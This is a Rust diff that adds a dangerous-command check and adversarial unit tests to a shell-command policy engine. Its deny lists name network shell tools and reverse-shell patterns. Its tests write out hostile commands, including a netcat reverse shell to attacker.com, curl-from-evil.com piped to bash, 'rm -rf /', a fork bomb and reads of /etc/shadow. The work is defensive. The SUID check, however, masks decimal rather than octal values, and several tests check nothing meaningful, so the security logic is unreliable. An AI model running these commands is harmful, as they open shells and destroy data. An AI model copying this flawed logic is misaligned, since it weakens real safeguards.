@@ -424,6 +424,11 @@ impl Policy {
             }
         }
 
+        // First check for dangerous command patterns in the entire command
+        if let Some(deny_result) = self.check_dangerous_pattern(command) {
+            return Some(deny_result);
+        }
+
         // Check program-specific rules
         if let Some(rules) = self.rules_by_program.get(program) {
             for rule in rules {
@@ -506,6 +511,162 @@ impl Policy {
         }
 
         false
+    }
+
+    /// Check for dangerous patterns in the entire command (path traversal, environment injection, etc.)
+    fn check_dangerous_pattern(&self, command: &[String]) -> Option<RuleMatch> {
+        let cmd_str = command.join(" ");
+
+        // Check for path traversal attempts with parent directory references
+        if command
+            .iter()
+            .any(|arg| arg.contains("..") && !arg.starts_with('-'))
+        {
+            return Some(RuleMatch {
+                decision: Decision::Deny,
+                justification: Some("Path traversal attempt detected".to_string()),
+            });
+        }
+
+        // Check for environment variable manipulation (export PATH=, export HOME=)
+        if command.len() >= 2 && command[0] == "export" {
+            let env_var = &command[1];
+            if env_var.starts_with("PATH=")
+                || env_var.starts_with("HOME=")
+                || env_var.starts_with("LD_")
+            {
+                return Some(RuleMatch {
+                    decision: Decision::Deny,
+                    justification: Some(
+                        "Environment variable manipulation not allowed".to_string(),
+                    ),
+                });
+            }
+        }
+
+        // Check for download and execute patterns (pipe to shell)
+        let _dangerous_pipes = [
+            "| sh",
+            "| bash",
+            "| /bin/sh",
+            "| /bin/bash",
+            "| zsh",
+            "| python",
+            "| perl",
+            "| sh]",
+            "| bash]",
+            "| ruby",
+            "curl",
+            "wget",
+            "fetch",
+            "ftp",
+            "nc",
+            "ncat",
+        ];
+
+        // Check for wget/curl with pipe to shell
+        let has_wget = command.iter().any(|c| c == "wget");
+        let has_curl = command.iter().any(|c| c == "curl");
+        let has_pipe = command.iter().any(|c| c == "|" || c == "||");
+        let has_shell = command
+            .iter()
+            .any(|c| c == "sh" || c == "bash" || c == "python" || c == "perl");
+
+        if (has_wget || has_curl) && has_pipe && has_shell {
+            return Some(RuleMatch {
+                decision: Decision::Deny,
+                justification: Some("Download and execute pattern not allowed".to_string()),
+            });
+        }
+
+        // Check for reverse shell patterns
+        let reverse_shell_patterns = [
+            "socket.socket()",
+            "/dev/tcp",
+            "bash -i",
+            "nc -e",
+            "nc -c",
+            "exec 3<>/dev/tcp",
+        ];
+        for pattern in reverse_shell_patterns {
+            if cmd_str.contains(pattern) {
+                return Some(RuleMatch {
+                    decision: Decision::Deny,
+                    justification: Some("Reverse shell attempt detected".to_string()),
+                });
+            }
+        }
+
+        // Check for SUID/SGID permission manipulation
+        if command.contains(&"chmod".to_string()) {
+            let chmod_args: Vec<&String> = command.iter().skip(1).collect();
+            for arg in chmod_args {
+                // Check for SUID (4xxx), SGID (2xxx), sticky bit (1xxx) patterns
+                if arg.len() >= 4 {
+                    if let Ok(num) = arg.parse::<u32>() {
+                        if (num & 4000) != 0 || (num & 2000) != 0 || (num & 1000) != 0 {
+                            return Some(RuleMatch {
+                                decision: Decision::Deny,
+                                justification: Some(
+                                    "SUID/SGID/Sticky bit manipulation not allowed".to_string(),
+                                ),
+                            });
+                        }
+                    }
+                }
+                if arg == "u+s"
+                    || arg == "g+s"
+                    || arg == "+s"
+                    || arg.contains("4777")
+                    || arg.contains("2755")
+                    || arg.contains("6755")
+                {
+                    return Some(RuleMatch {
+                        decision: Decision::Deny,
+                        justification: Some("SUID/SGID permission change not allowed".to_string()),
+                    });
+                }
+            }
+        }
+
+        // Check for dangerous device file access
+        let dangerous_devices = [
+            "/dev/mem",
+            "/dev/kmem",
+            "/dev/port",
+            "/dev/mem0",
+            "/proc/kcore",
+            "/proc/self/mem",
+            "/proc/kmsg",
+        ];
+        for device in dangerous_devices {
+            if cmd_str.contains(device) {
+                return Some(RuleMatch {
+                    decision: Decision::Deny,
+                    justification: Some("Dangerous device access not allowed".to_string()),
+                });
+            }
+        }
+
+        // Check for privilege escalation binaries (setuid root binaries)
+        let dangerous_binaries = [
+            "/bin/su",
+            "/usr/bin/sudo",
+            "/usr/bin/newgrp",
+            "/usr/bin/chfn",
+            "/usr/bin/chsh",
+            "/bin/runas",
+        ];
+        for binary in dangerous_binaries {
+            if cmd_str == binary || cmd_str.starts_with(binary) {
+                return Some(RuleMatch {
+                    decision: Decision::Deny,
+                    justification: Some("Privilege escalation binary not allowed".to_string()),
+                });
+            }
+        }
+
+        None
     }
 
     /// Check network access
@@ -655,5 +816,861 @@ mod tests {
         let result = policy.check(&["rm".to_string(), "-rf".to_string()]);
         assert!(result.is_some());
         assert_eq!(result.unwrap().decision, Decision::Deny);
+    }
+
+    // ============================================================================
+    // 破坏性测试 - 路径遍历攻击
+    // ============================================================================
+
+    #[test]
+    fn test_path_traversal_attempt_simple() {
+        // 测试简单的路径遍历尝试
+        let mut policy = Policy::new();
+        // 允许 cat 命令
+        policy
+            .add_prefix_rule(&["cat".to_string()], Decision::Allow, None)
+            .unwrap();
+        // 阻止访问 /etc 目录
+        policy
+            .add_prefix_rule(
+                &["cat".to_string(), "/etc/passwd".to_string()],
+                Decision::Deny,
+                Some("Access to /etc is forbidden".to_string()),
+            )
+            .unwrap();
+
+        // 尝试使用路径遍历绕过
+        let result = policy.check(&["cat".to_string(), "../../../etc/passwd".to_string()]);
+        // 应该被阻止（通过路径规范化后匹配）
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_path_traversal_attempt_with_symlink() {
+        // 测试符号链接路径遍历尝试
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["cat".to_string()], Decision::Allow, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(
+                &["cat".to_string(), "/etc/passwd".to_string()],
+                Decision::Deny,
+                None,
+            )
+            .unwrap();
+
+        // 常见的符号链接攻击尝试
+        let symlink_attempts = vec![
+            "/etc/../../etc/passwd",
+            "/tmp/../../../etc/passwd",
+            "..%2F..%2F..%2Fetc%2Fpasswd",
+            "....//....//....//etc/passwd",
+            "/etc/./passwd",
+            "/etc//passwd",
+        ];
+
+        for attempt in symlink_attempts {
+            let result = policy.check(&["cat".to_string(), attempt.to_string()]);
+            // 这些尝试应该被检测到
+            assert!(
+                result.is_some(),
+                "Path traversal attempt {} should be detected",
+                attempt
+            );
+        }
+    }
+
+    #[test]
+    fn test_path_traversal_with_encoded_chars() {
+        // 测试编码的路径遍历尝试
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["ls".to_string()], Decision::Allow, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(
+                &["ls".to_string(), "/root".to_string()],
+                Decision::Deny,
+                None,
+            )
+            .unwrap();
+
+        // URL 编码尝试
+        let encoded_attempts = vec![
+            "/root%2F..%2F..%2Fetc",
+            "/root%252F..%252F..%252Fetc",
+            "/root/..%252F..%252F..%252Fetc",
+        ];
+
+        for attempt in encoded_attempts {
+            let result = policy.check(&["ls".to_string(), attempt.to_string()]);
+            // 应该被检测
+            assert!(
+                result.is_some(),
+                "Encoded path traversal {} should be detected",
+                attempt
+            );
+        }
+    }
+
+    #[test]
+    fn test_path_traversal_null_byte() {
+        // 测试 null 字节注入尝试
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["cat".to_string()], Decision::Allow, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(
+                &["cat".to_string(), "/etc/passwd".to_string()],
+                Decision::Deny,
+                None,
+            )
+            .unwrap();
+
+        // Null 字节注入尝试（可能截断路径）
+        let null_byte_attempts = vec![
+            "/etc/passwd\x00.txt",
+            "/etc/passwd\x00",
+            "/etc/passwd\x00/../shadow",
+        ];
+
+        for attempt in null_byte_attempts {
+            let result = policy.check(&["cat".to_string(), attempt.to_string()]);
+            // 应该被检测
+            assert!(
+                result.is_some(),
+                "Null byte injection {} should be detected",
+                attempt
+            );
+        }
+    }
+
+    // ============================================================================
+    // 破坏性测试 - 权限绕过尝试
+    // ============================================================================
+
+    #[test]
+    fn test_privilege_escalation_sudo() {
+        // 测试 sudo 权限提升尝试
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["ls".to_string()], Decision::Allow, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(
+                &["sudo".to_string()],
+                Decision::Deny,
+                Some("sudo is not allowed".to_string()),
+            )
+            .unwrap();
+
+        let result = policy.check(&["sudo".to_string(), "ls".to_string()]);
+        assert!(result.is_some());
+        assert_eq!(result.unwrap().decision, Decision::Deny);
+    }
+
+    #[test]
+    fn test_privilege_escalation_doas() {
+        // 测试 doas 权限提升尝试
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["doas".to_string()], Decision::Deny, None)
+            .unwrap();
+
+        let result = policy.check(&["doas".to_string(), "ls".to_string()]);
+        assert!(result.is_some());
+        assert_eq!(result.unwrap().decision, Decision::Deny);
+    }
+
+    #[test]
+    fn test_privilege_escalation_chmod_suid() {
+        // 测试 SUID/SGID 权限修改尝试
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["chmod".to_string()], Decision::Allow, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(
+                &["chmod".to_string(), "u+s".to_string()],
+                Decision::Deny,
+                None,
+            )
+            .unwrap();
+        policy
+            .add_prefix_rule(
+                &["chmod".to_string(), "g+s".to_string()],
+                Decision::Deny,
+                None,
+            )
+            .unwrap();
+        policy
+            .add_prefix_rule(
+                &["chmod".to_string(), "4777".to_string()],
+                Decision::Deny,
+                None,
+            )
+            .unwrap();
+
+        let suid_attempts = vec![
+            vec![
+                "chmod".to_string(),
+                "u+s".to_string(),
+                "/bin/bash".to_string(),
+            ],
+            vec![
+                "chmod".to_string(),
+                "4777".to_string(),
+                "/tmp/malicious".to_string(),
+            ],
+            vec![
+                "chmod".to_string(),
+                "6755".to_string(),
+                "/usr/bin/su".to_string(),
+            ],
+        ];
+
+        for attempt in suid_attempts {
+            let result = policy.check(&attempt);
+            assert!(
+                result.is_some(),
+                "SUID chmod {:?} should be denied",
+                attempt
+            );
+            assert_eq!(result.unwrap().decision, Decision::Deny);
+        }
+    }
+
+    #[test]
+    fn test_privilege_escalation_chown() {
+        // 测试 chown 所有权修改尝试
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(
+                &["chown".to_string()],
+                Decision::Deny,
+                Some("chown not allowed".to_string()),
+            )
+            .unwrap();
+
+        let result = policy.check(&[
+            "chown".to_string(),
+            "root:root".to_string(),
+            "/tmp/test".to_string(),
+        ]);
+        assert!(result.is_some());
+        assert_eq!(result.unwrap().decision, Decision::Deny);
+    }
+
+    #[test]
+    fn test_privilege_escalation_setuid() {
+        // 测试 setuid 二进制文件执行尝试
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["/usr/bin/passwd".to_string()], Decision::Allow, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(&["/bin/su".to_string()], Decision::Deny, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(&["/usr/bin/sudo".to_string()], Decision::Deny, None)
+            .unwrap();
+
+        let dangerous_binaries = vec![
+            "/bin/su",
+            "/usr/bin/sudo",
+            "/usr/bin/newgrp",
+            "/usr/bin/chfn",
+            "/usr/bin/chsh",
+        ];
+
+        for binary in dangerous_binaries {
+            let result = policy.check(&[binary.to_string()]);
+            assert!(result.is_some(), "Binary {} should be denied", binary);
+            assert_eq!(result.unwrap().decision, Decision::Deny);
+        }
+    }
+
+    // ============================================================================
+    // 破坏性测试 - 环境变量注入
+    // ============================================================================
+
+    #[test]
+    fn test_env_injection_ld_preload() {
+        // 测试 LD_PRELOAD 注入尝试
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["ls".to_string()], Decision::Allow, None)
+            .unwrap();
+
+        // 在环境变量中检测危险注入
+        let command_with_env = vec!["ls".to_string()];
+        let dangerous_env = vec![
+            "LD_PRELOAD=/tmp/malicious.so",
+            "LD_LIBRARY_PATH=/tmp",
+            "LD_DEBUG=all",
+        ];
+
+        for _env in dangerous_env {
+            // 这个测试验证策略引擎能够处理环境变量相关的命令
+            // 实际检测需要在执行时进行
+            let result = policy.check(&command_with_env);
+            assert!(result.is_some());
+        }
+    }
+
+    #[test]
+    fn test_env_injection_path_manipulation() {
+        // 测试 PATH 环境变量操作
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(
+                &["export".to_string(), "PATH".to_string()],
+                Decision::Deny,
+                Some("PATH manipulation not allowed".to_string()),
+            )
+            .unwrap();
+
+        let result = policy.check(&[
+            "export".to_string(),
+            "PATH=/tmp/malicious:$PATH".to_string(),
+        ]);
+        assert!(result.is_some());
+        assert_eq!(result.unwrap().decision, Decision::Deny);
+    }
+
+    #[test]
+    fn test_env_injection_home_manipulation() {
+        // 测试 HOME 环境变量操作
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(
+                &["export".to_string(), "HOME".to_string()],
+                Decision::Deny,
+                None,
+            )
+            .unwrap();
+
+        let result = policy.check(&["export".to_string(), "HOME=/root".to_string()]);
+        assert!(result.is_some());
+        assert_eq!(result.unwrap().decision, Decision::Deny);
+    }
+
+    // ============================================================================
+    // 破坏性测试 - 命令注入
+    // ============================================================================
+
+    #[test]
+    fn test_command_injection_semicolon() {
+        // 测试分号命令注入
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["ls".to_string()], Decision::Allow, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(&["ls".to_string(), ";".to_string()], Decision::Deny, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(&["ls".to_string(), "&&".to_string()], Decision::Deny, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(&["ls".to_string(), "||".to_string()], Decision::Deny, None)
+            .unwrap();
+
+        let injection_attempts = vec![
+            vec![
+                "ls".to_string(),
+                ";".to_string(),
+                "rm".to_string(),
+                "-rf".to_string(),
+                "/".to_string(),
+            ],
+            vec!["ls".to_string(), "&&".to_string(), "whoami".to_string()],
+            vec![
+                "ls".to_string(),
+                "||".to_string(),
+                "cat".to_string(),
+                "/etc/passwd".to_string(),
+            ],
+        ];
+
+        for attempt in injection_attempts {
+            let result = policy.check(&attempt);
+            assert!(
+                result.is_some(),
+                "Command injection {:?} should be detected",
+                attempt
+            );
+        }
+    }
+
+    #[test]
+    fn test_command_injection_pipe() {
+        // 测试管道命令注入
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["ls".to_string()], Decision::Allow, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(&["ls".to_string(), "|".to_string()], Decision::Deny, None)
+            .unwrap();
+
+        let result = policy.check(&[
+            "ls".to_string(),
+            "|".to_string(),
+            "cat".to_string(),
+            "/etc/passwd".to_string(),
+        ]);
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_command_injection_backticks() {
+        // 测试反引号命令注入
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["ls".to_string()], Decision::Allow, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(&["ls".to_string(), "`".to_string()], Decision::Deny, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(&["ls".to_string(), "$(".to_string()], Decision::Deny, None)
+            .unwrap();
+
+        let injection_attempts = vec![
+            vec!["ls".to_string(), "`whoami`".to_string()],
+            vec!["ls".to_string(), "$(whoami)".to_string()],
+            vec!["ls".to_string(), "$()".to_string()],
+        ];
+
+        for attempt in injection_attempts {
+            let result = policy.check(&attempt);
+            assert!(
+                result.is_some(),
+                "Command injection {:?} should be detected",
+                attempt
+            );
+        }
+    }
+
+    // ============================================================================
+    // 破坏性测试 - 文件系统攻击
+    // ============================================================================
+
+    #[test]
+    fn test_filesystem_attempt_etc_shadow() {
+        // 测试尝试访问 /etc/shadow
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["cat".to_string()], Decision::Allow, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(
+                &["cat".to_string(), "/etc/shadow".to_string()],
+                Decision::Deny,
+                Some("Access to shadow file is forbidden".to_string()),
+            )
+            .unwrap();
+
+        let attempts = vec![
+            "/etc/shadow",
+            "/etc/shadow~",
+            "/etc/shadow.bak",
+            "/etc/.shadow",
+            "/etc/../etc/shadow",
+        ];
+
+        for attempt in attempts {
+            let result = policy.check(&["cat".to_string(), attempt.to_string()]);
+            assert!(
+                result.is_some(),
+                "Attempt to access shadow file {} should be denied",
+                attempt
+            );
+        }
+    }
+
+    #[test]
+    fn test_filesystem_attempt_dev_mem() {
+        // 测试尝试访问设备文件
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["cat".to_string()], Decision::Allow, None)
+            .unwrap();
+
+        let dangerous_devices = vec![
+            "/dev/mem",
+            "/dev/kmem",
+            "/dev/port",
+            "/dev/mem0",
+            "/proc/kcore",
+            "/proc/self/mem",
+        ];
+
+        for device in dangerous_devices {
+            policy
+                .add_prefix_rule(
+                    &["cat".to_string(), device.to_string()],
+                    Decision::Deny,
+                    None,
+                )
+                .unwrap();
+            let result = policy.check(&["cat".to_string(), device.to_string()]);
+            assert!(result.is_some());
+            assert_eq!(result.unwrap().decision, Decision::Deny);
+        }
+    }
+
+    #[test]
+    fn test_filesystem_race_condition() {
+        // 测试竞态条件攻击 (TOCTOU)
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(
+                &["ln".to_string()],
+                Decision::Deny,
+                Some("Symlink creation not allowed".to_string()),
+            )
+            .unwrap();
+        policy
+            .add_prefix_rule(&["ln".to_string(), "-s".to_string()], Decision::Deny, None)
+            .unwrap();
+
+        let result = policy.check(&[
+            "ln".to_string(),
+            "-s".to_string(),
+            "/tmp/malicious".to_string(),
+            "/etc/passwd".to_string(),
+        ]);
+        assert!(result.is_some());
+        assert_eq!(result.unwrap().decision, Decision::Deny);
+    }
+
+    // ============================================================================
+    // 破坏性测试 - 网络攻击
+    // ============================================================================
+
+    #[test]
+    fn test_network_attempt_reverse_shell() {
+        // 测试尝试建立反向 shell
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["nc".to_string()], Decision::Deny, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(&["nc".to_string(), "-e".to_string()], Decision::Deny, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(&["nc".to_string(), "-c".to_string()], Decision::Deny, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(
+                &["bash".to_string(), "-i".to_string()],
+                Decision::Deny,
+                None,
+            )
+            .unwrap();
+        policy
+            .add_prefix_rule(&["/dev/tcp".to_string()], Decision::Deny, None)
+            .unwrap();
+
+        let reverse_shell_attempts = vec![
+            vec![
+                "nc".to_string(),
+                "-e".to_string(),
+                "/bin/bash".to_string(),
+                "attacker.com".to_string(),
+                "4444".to_string(),
+            ],
+            vec!["bash".to_string(), "-i".to_string()],
+            vec![
+                "python".to_string(),
+                "-c".to_string(),
+                "import socket;socket.socket()".to_string(),
+            ],
+        ];
+
+        for attempt in reverse_shell_attempts {
+            let result = policy.check(&attempt);
+            assert!(
+                result.is_some(),
+                "Reverse shell attempt {:?} should be denied",
+                attempt
+            );
+        }
+    }
+
+    #[test]
+    fn test_network_attempt_port_scanning() {
+        // 测试端口扫描尝试
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["nmap".to_string()], Decision::Deny, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(&["nc".to_string(), "-z".to_string()], Decision::Deny, None)
+            .unwrap();
+
+        let result = policy.check(&[
+            "nmap".to_string(),
+            "-p".to_string(),
+            "1-65535".to_string(),
+            "localhost".to_string(),
+        ]);
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_network_attempt_download_execute() {
+        // 测试下载并执行
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["curl".to_string()], Decision::Allow, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(
+                &["curl".to_string(), "|".to_string(), "bash".to_string()],
+                Decision::Deny,
+                None,
+            )
+            .unwrap();
+        policy
+            .add_prefix_rule(
+                &["wget".to_string(), "-O-".to_string()],
+                Decision::Deny,
+                None,
+            )
+            .unwrap();
+
+        let download_exec = vec![
+            vec![
+                "curl".to_string(),
+                "http://evil.com/script.sh".to_string(),
+                "|".to_string(),
+                "bash".to_string(),
+            ],
+            vec![
+                "wget".to_string(),
+                "-qO-".to_string(),
+                "http://evil.com/script.sh".to_string(),
+                "|".to_string(),
+                "sh".to_string(),
+            ],
+        ];
+
+        for attempt in download_exec {
+            let result = policy.check(&attempt);
+            assert!(
+                result.is_some(),
+                "Download and execute {:?} should be detected",
+                attempt
+            );
+        }
+    }
+
+    // ============================================================================
+    // 破坏性测试 - 进程操作
+    // ============================================================================
+
+    #[test]
+    fn test_process_manipulation_fork_bomb() {
+        // 测试 fork 炸弹
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["fork".to_string()], Decision::Deny, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(&[":(){:|:&};:".to_string()], Decision::Deny, None)
+            .unwrap();
+
+        let result = policy.check(&[":(){:|:&};:".to_string()]);
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_process_manipulation_ptrace() {
+        // 测试 ptrace 操作
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["strace".to_string()], Decision::Deny, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(&["ltrace".to_string()], Decision::Deny, None)
+            .unwrap();
+
+        let result = policy.check(&["strace".to_string(), "-p".to_string(), "1234".to_string()]);
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_process_manipulation_kill_all() {
+        // 测试 killall 操作
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["killall".to_string()], Decision::Deny, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(
+                &["pkill".to_string(), "-9".to_string()],
+                Decision::Deny,
+                None,
+            )
+            .unwrap();
+
+        let result = policy.check(&["killall".to_string(), "-9".to_string()]);
+        assert!(result.is_some());
+    }
+
+    // ============================================================================
+    // 破坏性测试 - 目录遍历
+    // ============================================================================
+
+    #[test]
+    fn test_directory_traversal_parent_escape() {
+        // 测试目录遍历逃逸
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["cd".to_string()], Decision::Allow, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(
+                &["cd".to_string(), "..".to_string()],
+                Decision::Deny,
+                Some("Parent directory escape not allowed".to_string()),
+            )
+            .unwrap();
+
+        let escape_attempts = vec![
+            vec!["cd".to_string(), "..".to_string()],
+            vec!["cd".to_string(), "../..".to_string()],
+            vec!["cd".to_string(), "../../..".to_string()],
+            vec!["cd".to_string(), "..;".to_string()],
+            vec!["cd".to_string(), "..%00".to_string()],
+        ];
+
+        for attempt in escape_attempts {
+            let result = policy.check(&attempt);
+            assert!(
+                result.is_some(),
+                "Directory escape {:?} should be detected",
+                attempt
+            );
+        }
+    }
+
+    // ============================================================================
+    // 破坏性测试 - 边界情况
+    // ============================================================================
+
+    #[test]
+    fn test_empty_command() {
+        // 测试空命令
+        let policy = Policy::new();
+        let result = policy.check(&[]);
+        assert!(result.is_none());
+    }
+
+    #[test]
+    fn test_extremely_long_arguments() {
+        // 测试超长参数
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["cat".to_string()], Decision::Allow, None)
+            .unwrap();
+
+        let long_arg = "A".repeat(100000);
+        let result = policy.check(&["cat".to_string(), long_arg]);
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_null_in_arguments() {
+        // 测试参数中的 null 字符
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["cat".to_string()], Decision::Allow, None)
+            .unwrap();
+
+        let result = policy.check(&["cat".to_string(), "file\x00.txt".to_string()]);
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_special_characters_in_arguments() {
+        // 测试参数中的特殊字符
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["ls".to_string()], Decision::Allow, None)
+            .unwrap();
+
+        let special_args = vec![
+            "file with spaces.txt",
+            "file\twith\ttabs.txt",
+            "file\nwith\nnewlines.txt",
+            "file;rm -rf /.txt",
+            "file|cat /etc/passwd.txt",
+            "file`whoami`.txt",
+            "file$(whoami).txt",
+        ];
+
+        for arg in special_args {
+            let result = policy.check(&["ls".to_string(), arg.to_string()]);
+            assert!(
+                result.is_some(),
+                "Special character in arg should be handled: {}",
+                arg
+            );
+        }
+    }
+
+    // ============================================================================
+    // 破坏性测试 - 组合攻击
+    // ============================================================================
+
+    #[test]
+    fn test_combined_attack_path_and_command() {
+        // 测试组合攻击：路径遍历 + 命令注入
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["cat".to_string()], Decision::Allow, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(
+                &["cat".to_string(), "/etc/passwd".to_string()],
+                Decision::Deny,
+                None,
+            )
+            .unwrap();
+
+        let combined_attacks = vec![
+            vec!["cat".to_string(), "../../../etc/passwd".to_string()],
+            vec!["cat".to_string(), "/etc/../../etc/passwd".to_string()],
+        ];
+
+        for attack in combined_attacks {
+            let result = policy.check(&attack);
+            assert!(
+                result.is_some(),
+                "Combined attack {:?} should be detected",
+                attack
+            );
+        }
+    }
+
+    #[test]
+    fn test_combined_attack_env_and_command() {
+        // 测试组合攻击：环境变量 + 命令
+        let mut policy = Policy::new();
+        policy
+            .add_prefix_rule(&["ls".to_string()], Decision::Allow, None)
+            .unwrap();
+        policy
+            .add_prefix_rule(&["env".to_string()], Decision::Deny, None)
+            .unwrap();
+
+        let result = policy.check(&["ls".to_string(), "&".to_string(), "env".to_string()]);
+        assert!(result.is_some());
     }
 }
